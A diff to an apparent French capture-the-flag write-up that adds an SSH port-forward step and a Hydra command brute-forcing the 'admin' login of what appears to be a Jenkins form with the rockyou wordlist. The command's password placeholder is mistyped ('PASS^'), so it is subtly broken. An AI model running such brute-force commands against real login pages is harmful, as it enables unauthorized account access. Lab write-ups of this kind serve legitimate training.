@@ -193,4 +193,13 @@ On va renvoyer le flux web vers moi via un SSH
 ```
 ssh -L 4545:172.17.0.2:8080 aubreanna@10.10.116.71
 ```
-Maintenant, depuis le navigateur, avec l'url **localhost:4545** on vois le résultat de **172.17.0.2:8080**
+Maintenant, depuis le navigateur, avec l'url **localhost:4545** on vois le résultat de **172.17.0.2:8080**.
+
+Après une longue recherche infructueuse, je me laisse tenter par un brute force, sur la docs, il précise que l'identifiant par defaut est **admin**. On va bruteforce ce compte !
+
+on va utiliser Hydra pour cela :
+
+```
+hydra -l admin -P /home/kali/Wordlist/rockyou.txt 10.10.116.71 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password" -I
+```
+
